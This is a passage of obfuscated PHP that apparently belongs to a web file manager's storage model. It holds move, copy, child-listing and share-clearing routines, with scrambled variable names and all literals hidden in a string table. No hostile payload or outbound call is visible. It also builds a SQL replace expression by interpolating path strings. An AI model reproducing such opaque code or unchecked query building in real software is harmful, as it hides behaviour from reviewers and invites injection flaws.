&$®±ª•Ü) { $ªÛŞŞ§ü =& $_SERVER[´È¥ö†ö]; $Õ¨ğ›Ö = $this->sourceInfoCache($»‰¹´áï); $Ë—šÓ = $this->sourceInfoCache($Ş ÓÂ—‘); $¨øÕÏº = $this->_makeItemData($Õ¨ğ›Ö, $Ë—šÓ, $ûíÀôó ); Hook::trigger($ªÛŞŞ§ü[650], $¨øÕÏº); Hook::trigger($ªÛŞŞ§ü[651], array($ªÛŞŞ§ü[652], $¨øÕÏº, 0)); $Óáø‰û = $this->add($¨øÕÏº); $ê¯²•¶‡ = array($ªÛŞŞ§ü[193] => $Óáø‰û, $ªÛŞŞ§ü[32] => $ûíÀôó ); $this->_copyApplyMeta($ê¯²•¶‡, $®±ª•Ü); if ($Õ¨ğ›Ö[$ªÛŞŞ§ü[496]] != $ªÛŞŞ§ü[91]) { $®±ª•Ü[$ªÛŞŞ§ü[643]][] = $Õ¨ğ›Ö[$ªÛŞŞ§ü[552]]; return $Óáø‰û; } $£±Ñ™¬ = array(); $ğ“ÓñÏò = array(); $this->_childrenListAll($»‰¹´áï, $£±Ñ™¬); $…®º„™ = count($£±Ñ™¬); if ($…®º„™ == 0) { return $Óáø‰û; } $ÃÖçŸºÆ = $this->sourceInfo($Óáø‰û); foreach ($£±Ñ™¬ as $á™Œ›¡) { $­ğ½™¿ = $this->_makeItemData($á™Œ›¡, $ÃÖçŸºÆ, $á™Œ›¡[$ªÛŞŞ§ü[32]]); $­ğ½™¿[$ªÛŞŞ§ü[595]] = $á™Œ›¡[$ªÛŞŞ§ü[595]]; $ğ“ÓñÏò[] = $­ğ½™¿; } $this->chunkEventSet($ªÛŞŞ§ü[653], array($ªÛŞŞ§ü[654], $¨øÕÏº, $…®º„™)); $this->addAll($ğ“ÓñÏò, array(), !1); $ÍêÉİ = $this->where(array($ªÛŞŞ§ü[192] => $Óáø‰û))->select(); $„…ğÉÓ° = $this->_childrenMakeRelation($£±Ñ™¬, $ÍêÉİ); $„…ğÉÓ°[$»‰¹´áï] = $Óáø‰û; $€æ«öÖø = array(); $¸°²Ìå« = array(); foreach ($ÍêÉİ as $á™Œ›¡) { $ı¶°ÇàÑ = $á™Œ›¡[$ªÛŞŞ§ü[193]]; $‹§Ë«´Í = $this->_childrenMatch($„…ğÉÓ°, $á™Œ›¡, $ÃÖçŸºÆ); $€æ«öÖø[] = array($ªÛŞŞ§ü[193], $ı¶°ÇàÑ, $ªÛŞŞ§ü[192], $‹§Ë«´Í[$ªÛŞŞ§ü[192]]); $¸°²Ìå«[] = array($ªÛŞŞ§ü[193], $ı¶°ÇàÑ, $ªÛŞŞ§ü[595], $‹§Ë«´Í[$ªÛŞŞ§ü[595]]); $this->_copyApplyMeta($á™Œ›¡, $®±ª•Ü); if ($á™Œ›¡[$ªÛŞŞ§ü[496]] != $ªÛŞŞ§ü[91]) { $®±ª•Ü[$ªÛŞŞ§ü[643]][] = $á™Œ›¡[$ªÛŞŞ§ü[552]]; } } $this->chunkEventSet($ªÛŞŞ§ü[655], array($ªÛŞŞ§ü[656], $¨øÕÏº, $…®º„™)); $this->saveAll($€æ«öÖø); $this->chunkEventSet($ªÛŞŞ§ü[657], array($ªÛŞŞ§ü[658], $¨øÕÏº, $…®º„™)); $this->saveAll($¸°²Ìå«); return $Óáø‰û; } private function _childrenMakeRelation($Ää©ÆÄ›, $öù¦è€Ü) { $šúı‘‘š =& $_SERVER[´È¥ö†ö]; $‚ÎâìÛö = array(); $Ç ©¸¡Ä = array(); foreach ($Ää©ÆÄ› as $ÍİÉŒğ) { $ı¼ƒ˜¿á = $ÍİÉŒğ[$šúı‘‘š[32]] . $šúı‘‘š[8] . $ÍİÉŒğ[$šúı‘‘š[595]]; $‚ÎâìÛö[$ı¼ƒ˜¿á] = $ÍİÉŒğ[$šúı‘‘š[193]]; } foreach ($öù¦è€Ü as $ÍİÉŒğ) { $ı¼ƒ˜¿á = $ÍİÉŒğ[$šúı‘‘š[32]] . $šúı‘‘š[8] . $ÍİÉŒğ[$šúı‘‘š[595]]; $¥ç„½Ñ = $‚ÎâìÛö[$ı¼ƒ˜¿á]; $Ç ©¸¡Ä[$¥ç„½Ñ] = $ÍİÉŒğ[$šúı‘‘š[193]]; } return $Ç ©¸¡Ä; } private function _childrenMatch($¦Ğ’‘¹ä, $Œİ©Ì¢â, $‰ÃïÌ¸ú) { $Èó‹Ê½ï =& $_SERVER[´È¥ö†ö]; $€±­İ·¬ = $‰ÃïÌ¸ú[$Èó‹Ê½ï[595]]; $Ş˜•‹‰¶ = $this->parentLevelArray($Œİ©Ì¢â[$Èó‹Ê½ï[595]]); foreach ($Ş˜•‹‰¶ as $ªò–ˆØ) { if (isset($¦Ğ’‘¹ä[$ªò–ˆØ])) { $€±­İ·¬ .= $¦Ğ’‘¹ä[$ªò–ˆØ] . $Èó‹Ê½ï[659]; } } $€±­İ·¬ = rtrim($€±­İ·¬, $Èó‹Ê½ï[50]) . $Èó‹Ê½ï[50]; $€“†—ı¼ = $this->parentLevelArray($€±­İ·¬); $ìş¥‘ŸĞ = $€“†—ı¼[count($€“†—ı¼) - 1]; return array($Èó‹Ê½ï[192] => $ìş¥‘ŸĞ, $Èó‹Ê½ï[595] => $€±­İ·¬); } private function _makeItemData($Ã˜Şñ ¬, $¨ªû¨, $üˆİàï) { $Š’Ï¹” =& $_SERVER[´È¥ö†ö]; $ÎçÌíÔº = array($Š’Ï¹”[660] => $Ã˜Şñ ¬[$Š’Ï¹”[496]], $Š’Ï¹”[505] => $üˆİàï, $Š’Ï¹”[661] => $Ã˜Şñ ¬[$Š’Ï¹”[497]] ? $Ã˜Şñ ¬[$Š’Ï¹”[497]] : $Š’Ï¹”[12], $Š’Ï¹”[553] => $Ã˜Şñ ¬[$Š’Ï¹”[552]] ? $Ã˜Şñ ¬[$Š’Ï¹”[552]] : 0, $Š’Ï¹”[631] => $Ã˜Şñ ¬[$Š’Ï¹”[79]] ? $Ã˜Şñ ¬[$Š’Ï¹”[79]] : 0, $Š’Ï¹”[662] => intval($¨ªû¨[$Š’Ï¹”[190]]), $Š’Ï¹”[663] => intval($¨ªû¨[$Š’Ï¹”[580]]), $Š’Ï¹”[664] => intval(USER_ID), $Š’Ï¹”[665] => intval(USER_ID), $Š’Ï¹”[488] => intval($¨ªû¨[$Š’Ï¹”[193]]), $Š’Ï¹”[666] => $¨ªû¨[$Š’Ï¹”[595]] . $¨ªû¨[$Š’Ï¹”[193]] . $Š’Ï¹”[50], $Š’Ï¹”[509] => $Ã˜Şñ ¬[$Š’Ï¹”[88]] ? $Ã˜Şñ ¬[$Š’Ï¹”[88]] : time(), $Š’Ï¹”[515] => 0, $Š’Ï¹”[667] => $Š’Ï¹”[12]); return $ÎçÌíÔº; } private function _copyApplyMeta($€­õ¹”Å, &$ÕÀ¾àÕ) { $­«¿Îò =& $_SERVER[´È¥ö†ö]; $µ§ÉŒˆÉ = $€­õ¹”Å[$­«¿Îò[193]]; $÷¹´–Õ = $€­õ¹”Å[$­«¿Îò[32]]; if (!isset($€­õ¹”Å[$­«¿Îò[668]]) || !$€­õ¹”Å[$­«¿Îò[668]] || $€­õ¹”Å[$­«¿Îò[668]] == $­«¿Îò[230]) { $ÕÀ¾àÕ[$­«¿Îò[645]][] = array($­«¿Îò[193], $µ§ÉŒˆÉ, $­«¿Îò[668], short_id($µ§ÉŒˆÉ)); } if (Input::check($÷¹´–Õ, $­«¿Îò[669])) { $ÕÀ¾àÕ[$­«¿Îò[644]][] = array($­«¿Îò[193] => $µ§ÉŒˆÉ, $­«¿Îò[97] => $­«¿Îò[549], $­«¿Îò[461] => str_replace($­«¿Îò[53], $­«¿Îò[12], Pinyin::get($÷¹´–Õ))); $ÕÀ¾àÕ[$­«¿Îò[644]][] = array($­«¿Îò[193] => $µ§ÉŒˆÉ, $­«¿Îò[97] => $­«¿Îò[548], $­«¿Îò[461] => Pinyin::get($÷¹´–Õ, $­«¿Îò[670])); } $ÕÀ¾àÕ[$­«¿Îò[644]][] = array($­«¿Îò[193] => $µ§ÉŒˆÉ, $­«¿Îò[97] => $­«¿Îò[528], $­«¿Îò[461] => KodSort::makeStr($÷¹´–Õ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($¤–ññØ) { $é×Ú†ß =& $_SERVER[´È¥ö†ö]; $Ûûµªª™ = $this->sourceInfo($¤–ññØ); $Ê–¼ı÷ü = $é×Ú†ß[671]; $—´Ã»Ôä = array($é×Ú†ß[595] => array($é×Ú†ß[626], $Ûûµªª™[$é×Ú†ß[595]] . $¤–ññØ . $é×Ú†ß[627]), $é×Ú†ß[516] => $this->targetIsDelete); $°¼î‰½° = $this->field($Ê–¼ı÷ü)->where($—´Ã»Ôä)->select(); if (!$°¼î‰½°) { return; } $°¼î‰½° = array_to_keyvalue($°¼î‰½°, $é×Ú†ß[193]); foreach ($°¼î‰½° as $Àû¢ŞæÄ) { $‹ĞÜŠ¼ï = $Àû¢ŞæÄ[$é×Ú†ß[192]]; $¤–ññØ = $Àû¢ŞæÄ[$é×Ú†ß[193]]; if (!isset($this->_childrenListCache[$¤–ññØ]) && $Àû¢ŞæÄ[$é×Ú†ß[496]] == $é×Ú†ß[91]) { $this->_childrenListCache[$¤–ññØ] = array(); } if (!isset($this->_childrenListCache[$‹ĞÜŠ¼ï])) { $this->_childrenListCache[$‹ĞÜŠ¼ï] = array(); } $this->_childrenListCache[$‹ĞÜŠ¼ï][$¤–ññØ] = $Àû¢ŞæÄ; $this->_childrenItemCache[$¤–ññØ] = $Àû¢ŞæÄ; } } private function _childrenListAll($„“âá«™, &$ÎÄşˆ¹³) { $şØîô¼¼ =& $_SERVER[´È¥ö†ö]; if (!isset($this->_childrenListCache[$„“âá«™])) { return; } $·„²Ù = $this->_childrenListCache[$„“âá«™]; foreach ($·„²Ù as $ŒŠÄ®ü => $ş·™Ï¬˜) { $ÎÄşˆ¹³[$ŒŠÄ®ü] = $ş·™Ï¬˜; if ($ş·™Ï¬˜[$şØîô¼¼[496]] == $şØîô¼¼[91]) { $this->_childrenListAll($ŒŠÄ®ü, $ÎÄşˆ¹³); } } } private function sourceInfoCache($óà‰×æ…) { if (isset($this->_childrenItemCache[$óà‰×æ…])) { return $this->_childrenItemCache[$óà‰×æ…]; } return $this->sourceInfo($óà‰×æ…); } private function _childrenList($ÃóÕä‡ı) { if (isset($this->_childrenListCache[$ÃóÕä‡ı])) { return $this->_childrenListCache[$ÃóÕä‡ı]; } return $this->_childrenListSelect($ÃóÕä‡ı); } private function _childrenListSelect($ø“Ÿ¡ñ) { $¸ˆ¸”Æ³ =& $_SERVER[´È¥ö†ö]; $—ï¯‹à = array($¸ˆ¸”Æ³[192] => $ø“Ÿ¡ñ, $¸ˆ¸”Æ³[516] => $this->targetIsDelete); $›÷Œ÷ıÈ = $this->where($—ï¯‹à)->select(); $›÷Œ÷ıÈ = $›÷Œ÷ıÈ ? $›÷Œ÷ıÈ : array(); $Æ¤ñîÊÎ = array_to_keyvalue($›÷Œ÷ıÈ, $¸ˆ¸”Æ³[193]); $this->_childrenListCache[$ø“Ÿ¡ñ] = $Æ¤ñîÊÎ; foreach ($Æ¤ñîÊÎ as $ø“Ÿ¡ñ => $ÄÇÂÌ¾û) { $this->_childrenItemCache[$ø“Ÿ¡ñ] = $ÄÇÂÌ¾û; } return $Æ¤ñîÊÎ; } private function fileNameExistAuto($ªˆÄ¢ù, $Äº‡ôÕ) { $Ù¬­ˆ¤± =& $_SERVER[´È¥ö†ö]; if ($Äº‡ôÕ[$Ù¬­ˆ¤±[516]] == $Ù¬­ˆ¤±[91]) { return $this->fileNameExist($ªˆÄ¢ù, $Äº‡ôÕ[$Ù¬­ˆ¤±[32]]); } return $this->fileNameExistCache($ªˆÄ¢ù, $Äº‡ôÕ[$Ù¬­ˆ¤±[32]]); } private function fileNameExistCache($¿·î¯Ş, $üú¡ßÈÈ) { $«ª†¢ï¤ =& $_SERVER[´È¥ö†ö]; $üú¡ßÈÈ = strtolower($üú¡ßÈÈ); $¦ıçªÏ¾ = $this->_childrenList($¿·î¯Ş); foreach ($¦ıçªÏ¾ as $ó³¿â›) { if ($üú¡ßÈÈ == strtolower($ó³¿â›[$«ª†¢ï¤[32]])) { return $ó³¿â›[$«ª†¢ï¤[193]]; } } return !1; } private function fileNameAutoCache($ï¯éº†®, $äÛ¦·„, $Ø®òšâ¨, $«¬¤î¾À) { $ó¯¶ûßÜ =& $_SERVER[´È¥ö†ö]; $µƒ¯® = $this->_childrenList($ï¯éº†®); $æø˜Àó† = array_to_keyvalue($µƒ¯®, $ó¯¶ûßÜ[12], $ó¯¶ûßÜ[32]); return $this->fileNameAutoGet($æø˜Àó†, $äÛ¦·„, $Ø®òšâ¨, $«¬¤î¾À); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ ¨îïÎ‡, $äƒÂñüŸ, $ê”óö = REPEAT_REPLACE, $êÅ§¦« = '') { $³«÷Ò†à =& $_SERVER[´È¥ö†ö]; $¿¿…Ù„ = $this->sourceInfo($ ¨îïÎ‡); $ÅÔĞø—ş = $this->sourceInfo($äƒÂñüŸ); if ($¿¿…Ù„[$³«÷Ò†à[192]] == $ÅÔĞø—ş[$³«÷Ò†à[193]]) { if ($¿¿…Ù„[$³«÷Ò†à[516]] == $³«÷Ò†à[91]) { Model($³«÷Ò†à[514])->restore(array($ ¨îïÎ‡)); } if (!$êÅ§¦« || $êÅ§¦« == $¿¿…Ù„[$³«÷Ò†à[32]]) { return $ ¨îïÎ‡; } } $—Ô—âŸ­ = $this->pathInfoMore($ ¨îïÎ‡); if ($this->isParentOf($ ¨îïÎ‡, $äƒÂñüŸ)) { return !1; } if (!$¿¿…Ù„ || !$ÅÔĞø—ş || $ÅÔĞø—ş[$³«÷Ò†à[496]] != $³«÷Ò†à[91]) { return !1; } Hook::trigger($³«÷Ò†à[672], $—Ô—âŸ­); $this->targetIsDelete = intval($¿¿…Ù„[$³«÷Ò†à[516]]); if ($¿¿…Ù„[$³«÷Ò†à[192]] == $äƒÂñüŸ && $êÅ§¦« != $¿¿…Ù„[$³«÷Ò†à[32]]) { $¦˜“éÀ = $this->fileNameExist($äƒÂñüŸ, $êÅ§¦«); if ($¦˜“éÀ && $¿¿…Ù„[$³«÷Ò†à[496]] == $³«÷Ò†à[230]) { $Àûñ” = $this->sourceInfo($¦˜“éÀ); $ß¢Şñ = $this->fileHistory($Àûñ”, $¿¿…Ù„[$³«÷Ò†à[552]], $¿¿…Ù„[$³«÷Ò†à[79]]); if (!$ß¢Şñ) { Model($³«÷Ò†à[555])->remove($¿¿…Ù„[$³«÷Ò†à[552]]); } $this->removeNow($ ¨îïÎ‡, !1); $this->folderSizeReset($äƒÂñüŸ); Hook::trigger($³«÷Ò†à[673], $—Ô—âŸ­); return $¦˜“éÀ; } } $á•Š¼ù = $êÅ§¦« ? $êÅ§¦« : $¿¿…Ù„[$³«÷Ò†à[32]]; $this->lockMoveStart($ ¨îïÎ‡); $this->lockWriteStart($äƒÂñüŸ, $á•Š¼ù); $”ùè®¥Ş = array($³«÷Ò†à[643] => array(), $³«÷Ò†à[674] => !1); $this->clearShare($ ¨îïÎ‡, $äƒÂñüŸ); $Ş‰Üù“Ú = $this->fileNameExistAuto($äƒÂñüŸ, $¿¿…Ù„); $Îü–ùÍ³ = $this->_move($ ¨îïÎ‡, $äƒÂñüŸ, $ê”óö, $”ùè®¥Ş, $êÅ§¦«); $this->sourceCacheClear(); if ($¿¿…Ù„[$³«÷Ò†à[496]] == $³«÷Ò†à[91] && $Ş‰Üù“Ú) { $this->folderSizeResetChildren($Îü–ùÍ³); } Model($³«÷Ò†à[232])->linkAdd($”ùè®¥Ş[$³«÷Ò†à[643]]); if ($Îü–ùÍ³ && $Ş‰Üù“Ú && $”ùè®¥Ş[$³«÷Ò†à[674]]) { $Œšµ³Ë“ = $¿¿…Ù„[$³«÷Ò†à[496]] == $³«÷Ò†à[91] ? $this->_childrenListSelect($ ¨îïÎ‡) : !1; $Ò•ÃÁÊû = $Œšµ³Ë“ && count($Œšµ³Ë“) > 0 ? !0 : !1; $this->removeNow($ ¨îïÎ‡, $Ò•ÃÁÊû); } $this->lockMoveEnd($ ¨îïÎ‡); $this->lockWriteEnd($äƒÂñüŸ, $á•Š¼ù); $this->folderSizeReset($¿¿…Ù„[$³«÷Ò†à[192]]); $this->folderSizeReset($äƒÂñüŸ); $çÄÍ¡û› = array($¿¿…Ù„[$³«÷Ò†à[192]], $äƒÂñüŸ); if ($¿¿…Ù„[$³«÷Ò†à[496]] == $³«÷Ò†à[91]) { $çÄÍ¡û›[] = $ ¨îïÎ‡; } $this->updateModifyTime($çÄÍ¡û›); Model($³«÷Ò†à[647])->eventMove($ ¨îïÎ‡, $¿¿…Ù„[$³«÷Ò†à[192]], $äƒÂñüŸ); Hook::trigger($³«÷Ò†à[673], $—Ô—âŸ­); return $Îü–ùÍ³; } private function _move($ùÉÚ·É›, $¸£áŠ», $ã‘ß£¢º, &$Ï¦»ï×‹, $•²˜Ã™Ö = '') { $Ãš½’©½ =& $_SERVER[´È¥ö†ö]; $‚Øßó‹ = $this->sourceInfo($ùÉÚ·É›); $ø£è–ğí = $‚Øßó‹[$Ãš½’©½[496]] == $Ãš½’©½[91]; $¬œï±“º = $•²˜Ã™Ö ? $•²˜Ã™Ö : $‚Øßó‹[$Ãš½’©½[32]]; $øíè¹ = $this->fileNameExistAuto($¸£áŠ», $‚Øßó‹); $this->lockMoveStart($ùÉÚ·É›); $this->lockWriteStart($¸£áŠ», $¬œï±“º); if (!$øíè¹) { return $this->_moveForce($ùÉÚ·É›, $¸£áŠ», $¬œï±“º); } $™›Ğ‹ëã = $øíè¹; $ã§şß™  = !1; if ($ø£è–ğí) { if ($ã‘ß£¢º == REPEAT_RENAME_FOLDER) { $¬œï±“º = $this->fileNameAuto($¸£áŠ», $¬œï±“º, $ã‘ß£¢º, $ø£è–ğí); $™›Ğ‹ëã = $this->_moveForce($ùÉÚ·É›, $¸£áŠ», $¬œï±“º); } else { $œ³ªçåä = $this->_childrenListSelect($ùÉÚ·É›); foreach ($œ³ªçåä as $ò½±åç¤) { $ä†¦ğˆØ = REPEAT_REPLACE; $this->_move($ò½±åç¤[$Ãš½’©½[193]], $øíè¹, $ä†¦ğˆØ, $Ï¦»ï×‹); } $ã§şß™  = !0; } } else { if ($ã‘ß£¢º == REPEAT_RENAME || $ã‘ß£¢º == REPEAT_RENAME_FOLDER) { $¬œï±“º = $this->fileNameAuto($¸£áŠ», $¬œï±“º, $ã‘ß£¢º, $ø£è–ğí); $™›Ğ‹ëã = $this->_moveForce($ùÉÚ·É›, $¸£áŠ», $¬œï±“º); } else { $­‘—Ïñç = $this->sourceInfoCache($øíè¹); $÷ã†ñ•Â = $this->fileHistory($­‘—Ïñç, $‚Øßó‹[$Ãš½’©½[552]], $‚Øßó‹[$Ãš½’©½[79]]); if ($÷ã†ñ•Â) { $Ï¦»ï×‹[$Ãš½’©½[643]][] = $‚Øßó‹[$Ãš½’©½[552]]; } $ã§şß™  = !0; } } if ($ã§şß™ ) { $Ï¦»ï×‹[$Ãš½’©½[674]] = !0; } return $™›Ğ‹ëã; } private function _moveForce($û­öª“é, $óÃÖÏ , $‘šì”›) { $‘ÏÛş¶¸ =& $_SERVER[´È¥ö†ö]; $¼ÏĞ”’ = $this->sourceInfo($û­öª“é); $İĞƒÇÙ¶ = $this->sourceInfo($óÃÖÏ ); $®“¼ïœ× = $¼ÏĞ”’[$‘ÏÛş¶¸[496]] == $‘ÏÛş¶¸[91]; $œ‘¡äö„ = array($‘ÏÛş¶¸[488] => $İĞƒÇÙ¶[$‘ÏÛş¶¸[193]], $‘ÏÛş¶¸[666] => $İĞƒÇÙ¶[$‘ÏÛş¶¸[595]] . $İĞƒÇÙ¶[$‘ÏÛş¶¸[193]] . $‘ÏÛş¶¸[50], $‘ÏÛş¶¸[662] => $İĞƒÇÙ¶[$‘ÏÛş¶¸[190]], $‘ÏÛş¶¸[663] => $İĞƒÇÙ¶[$‘ÏÛş¶¸[580]], $‘ÏÛş¶¸[665] => USER_ID, $‘ÏÛş¶¸[505] => $‘šì”›); $ßÇçğş = $¼ÏĞ”’[$‘ÏÛş¶¸[190]] == SourceModel::TYPE_GROUP && $İĞƒÇÙ¶[$‘ÏÛş¶¸[190]] == SourceModel::TYPE_GROUP && $¼ÏĞ”’[$‘ÏÛş¶¸[580]] == $İĞƒÇÙ¶[$‘ÏÛş¶¸[580]]; if (!$ßÇçğş && $this->moveClearAuth) { Model($‘ÏÛş¶¸[578])->authClear($û­öª“é); } $æŠÉ¼û¥ = $¼ÏĞ”’[$‘ÏÛş¶¸[516]] == $‘ÏÛş¶¸[91] && $İĞƒÇÙ¶[$‘ÏÛş¶¸[516]] != $‘ÏÛş¶¸[91]; if ($æŠÉ¼û¥) { $œ‘¡äö„[$‘ÏÛş¶¸[515]] = 0; } if ($®“¼ïœ×) { $…Ø÷æØÂ = array($‘ÏÛş¶¸[666] => array($‘ÏÛş¶¸[626], $¼ÏĞ”’[$‘ÏÛş¶¸[595]] . $¼ÏĞ”’[$‘ÏÛş¶¸[193]] . $‘ÏÛş¶¸[627])); $šÑ÷îˆâ = $¼ÏĞ”’[$‘ÏÛş¶¸[595]] . $¼ÏĞ”’[$‘ÏÛş¶¸[193]] . $‘ÏÛş¶¸[50]; $—É²³ÊŒ = $İĞƒÇÙ¶[$‘ÏÛş¶¸[595]] . $İĞƒÇÙ¶[$‘ÏÛş¶¸[193]] . $‘ÏÛş¶¸[50] . $¼ÏĞ”’[$‘ÏÛş¶¸[193]] . $‘ÏÛş¶¸[50]; $Š—í÷Ñ = array($‘ÏÛş¶¸[666] => array($‘ÏÛş¶¸[675], "\162\x65\x70\x6c\x61\143\x65\50\160\141\x72\145\x6e\164\x4c\x65\x76\x65\x6c\x2c\47{$šÑ÷îˆâ}\47\x2c\x27{$—É²³ÊŒ}\x27\x29"), $‘ÏÛş¶¸[662] => $İĞƒÇÙ¶[$‘ÏÛş¶¸[190]], $‘ÏÛş¶¸[663] => $İĞƒÇÙ¶[$‘ÏÛş¶¸[580]]); if ($æŠÉ¼û¥) { $Š—í÷Ñ[$‘ÏÛş¶¸[515]] = 0; } $this->where($…Ø÷æØÂ)->data($Š—í÷Ñ)->save(); } $this->where(array($‘ÏÛş¶¸[502] => $û­öª“é))->data($œ‘¡äö„)->save(); return $û­öª“é; } private function clearShare($ã¿½‘ô, $Æ””Ë¹õ) { $ßÊ²«€ =& $_SERVER[´È¥ö†ö]; $ÏâƒÎÜï = $this->sourceInfo($ã¿½‘ô); $›å¿õ¢£ = $this->sourceInfo($Æ””Ë¹õ); if ($ÏâƒÎÜï[$ßÊ²«€[580]] == $›å¿õ¢£[$ßÊ²«€[580]] && $ÏâƒÎÜï[$ßÊ²«€[190]] == $ßÊ²«€[676]) { return; } $»ÑÒòü‡ = array($ßÊ²«€[595] => array($ßÊ²«€[626], $ÏâƒÎÜï[$ßÊ²«€[595]] . $ã¿½‘ô . $ßÊ²«€[627])); $Õğ›Ìúñ = $this->field($ßÊ²«€[502])->where($»ÑÒòü‡)->getField($ßÊ²«€[193], !0); if (!$Õğ›Ìúñ) { return; } $»ÑÒòü‡ = array($ßÊ²«€[193] => array($ßÊ²«€[7], $Õğ›Ìúñ), $ßÊ²«€[677] => 1); $È•­¿¶ = Model($ßÊ²«€[678])->field($ßÊ²«€[679])->where($»ÑÒòü‡)->select(); if (!$È•­¿¶) { return; } $È•­¿¶ = array_to_keyvalue($È•­¿¶, $ßÊ²«€[12], $ßÊ²«€[679]); $»ÑÒòü‡ = array($ßÊ²«€[679] => array($ßÊ²«€[7], $È•­¿¶)); Model($ßÊ²«€[678])->where($»ÑÒòü‡)->save(array($ßÊ²«€[677] => 0)); Model($ßÊ²«€[680])->where($»ÑÒòü‡)->delete(); } public function copyFolderFromIO($´š¢ºÏ, $ÇÙéÆ´, $„ÇØç·Ï, $›®ß®çª, $—ú˜Ö˜ª, $‰œÍ‚Şı = false) { $À‰Æ¥º± =& $_SERVER[´È¥ö†ö]; $®‚„­à‡ = array($À‰Æ¥º±[644] => array(), $À‰Æ¥º±[645] => array(), $À‰Æ¥º±[643] => array(), $À‰Æ¥º±[681] => array()); $¼Ïí¥½– = $‰œÍ‚Şı ? $‰œÍ‚Şı : $´š¢ºÏ->pathThis($ÇÙéÆ´); $³îÑ°¤Ñ = $this->fileNameExist($„ÇØç·Ï, $¼Ïí¥½–); $ŠıáÜ¢Í = $this->mkdir($„ÇØç·Ï, $¼Ïí¥½–, $›®ß®çª); if (!$³îÑ°¤Ñ || $›®ß®çª == REPEAT_RENAME_FOLDER) { $›®ß®çª = !1; } if ($³îÑ°¤Ñ) { $this->_childrenAllMake($³îÑ°¤Ñ); } Hook::trigger($À‰Æ¥º±[682]); $this->_copyChildTo($´š¢ºÏ, $ÇÙéÆ´, $ŠıáÜ¢Í, $›®ß®çª, $®‚„­à‡, $—ú˜Ö˜ª); Hook::trigger($À‰Æ¥º±[683]); if ($ŠıáÜ¢Í) { $this->folderSizeResetChildren($ŠıáÜ¢Í); } $this->_childrenListClear(); Model($À‰Æ¥º±[646])->addAll($®‚„­à‡[$À‰Æ¥º±[644]], array(), !0); Model($À‰Æ¥º±[647])->eventCopy($ŠıáÜ¢Í); $this->saveAll($®‚„­à‡[$À‰Æ¥º±[645]]); Model($À‰Æ¥º±[555])->linkAdd($®‚„­à‡[$À‰Æ¥º±[643]]); Model($À‰Æ¥º±[555])->remove($®‚„­à‡[$À‰Æ¥º±[681]]); $this->folderSizeReset($„ÇØç·Ï); $this->updateModifyTime($„ÇØç·Ï); return $ŠıáÜ¢Í; } private function _copyChildTo($„üÛæÈë, $±ÑÓ†‹, $Ø‘ÈŞ…ø, $„«ß·“, &$½É—©¼¸, $Ü„—àÎ) { $±¿‹æ‘ =& $_SERVER[´È¥ö†ö]; $Ú”êÒ¦ = $this->sourceInfoCache($Ø‘ÈŞ…ø); $º‰ÜÉ = $„üÛæÈë->listPath($±ÑÓ†‹); $º‰ÜÉ = $º‰ÜÉ ? $º‰ÜÉ : array($±¿‹æ‘[86] => array(), $±¿‹æ‘[85] => array()); $ÅÍÂ¬˜ü = array_merge($º‰ÜÉ[$±¿‹æ‘[86]], $º‰ÜÉ[$±¿‹æ‘[85]]); $Ó×àíğÖ = $this->_addFiles($„üÛæÈë, $º‰ÜÉ[$±¿‹æ‘[86]], $Ü„—àÎ); $²ğìóĞí = array(); foreach ($ÅÍÂ¬˜ü as &$ãôŠ¢«ä) { if (isset($Ó×àíğÖ[$ãôŠ¢«ä[$±¿‹æ‘[32]]])) { $ãôŠ¢«ä = $Ó×àíğÖ[$ãôŠ¢«ä[$±¿‹æ‘[32]]]; } $ãôŠ¢«ä[$±¿‹æ‘[496]] = $ãôŠ¢«ä[$±¿‹æ‘[33]] == $±¿‹æ‘[78]; $ãôŠ¢«ä[$±¿‹æ‘[497]] = substr(_get($ãôŠ¢«ä, $±¿‹æ‘[169], $±¿‹æ‘[12]), 0, 10); $ãôŠ¢«ä[$±¿‹æ‘[79]] = _get($ãôŠ¢«ä, $±¿‹æ‘[79], 0); $ãôŠ¢«ä[$±¿‹æ‘[552]] = _get($ãôŠ¢«ä, $±¿‹æ‘[552], 0); if (!isset($ãôŠ¢«ä[$±¿‹æ‘[684]]) && $ãôŠ¢«ä[$±¿‹æ‘[552]]) { $½É—©¼¸[$±¿‹æ‘[681]][] = $ãôŠ¢«ä[$±¿‹æ‘[552]]; } if ($„«ß·“) { $²Ëó‘ È = $this->fileNameExistCache($Ø‘ÈŞ…ø, $ãôŠ¢«ä[$±¿‹æ‘[32]]); if ($²Ëó‘ È) { if ($ãôŠ¢«ä[$±¿‹æ‘[496]] || $„«ß·“ == REPEAT_SKIP) { continue; } if ($„«ß·“ == REPEAT_REPLACE) { $™¶‹ÊŞ = $this->sourceInfoCache($²Ëó‘ È); $ÈÊÓÚ¼ = $this->fileHistory($™¶‹ÊŞ, $ãôŠ¢«ä[$±¿‹æ‘[552]], $ãôŠ¢«ä[$±¿‹æ‘[79]]); if ($ÈÊÓÚ¼) { $½É—©¼¸[$±¿‹æ‘[643]][] = $ãôŠ¢«ä[$±¿‹æ‘[552]]; } continue; } else { if ($„«ß·“ == REPEAT_RENAME) { $ãôŠ¢«ä[$±¿‹æ‘[32]] = $this->fileNameAutoCache($Ø‘ÈŞ…ø, $ãôŠ¢«ä[$±¿‹æ‘[32]], $„«ß·“, !1); } } } } if (!$ãôŠ¢«ä[$±¿‹æ‘[496]] && $ãôŠ¢«ä[$±¿‹æ‘[552]] == 0) { continue; } if (!$ãôŠ¢«ä[$±¿‹æ‘[496]] && $ãôŠ¢«ä[$±¿‹æ‘[552]]) { $½É—©¼¸[$±¿‹æ‘[643]][] = $ãôŠ¢«ä[$±¿‹æ‘[552]]; } $²ğìóĞí[] = $this->_makeItemData($ãôŠ¢«ä, $Ú”êÒ¦, $ãôŠ¢«ä[$±¿‹æ‘[32]]); } unset($ãôŠ¢«ä); if (!empty($²ğìóĞí)) { $this->addAll($²ğìóĞí); $this->_childrenListSelect($Ø‘ÈŞ…ø); } $Û‘ØÃ = $this->_childrenList($Ø‘ÈŞ…ø); $Û‘ØÃ = array_to_keyvalue($Û‘ØÃ, $±¿‹æ‘[32]); foreach ($ÅÍÂ¬˜ü as $ãôŠ¢«ä) { $™¶‹ÊŞ = $Û‘ØÃ[$ãôŠ¢«ä[$±¿‹æ‘[32]]]; $É‘Æ¢êÉ = $™¶‹ÊŞ[$±¿‹æ‘[193]]; $this->_copyApplyMeta($™¶‹ÊŞ, 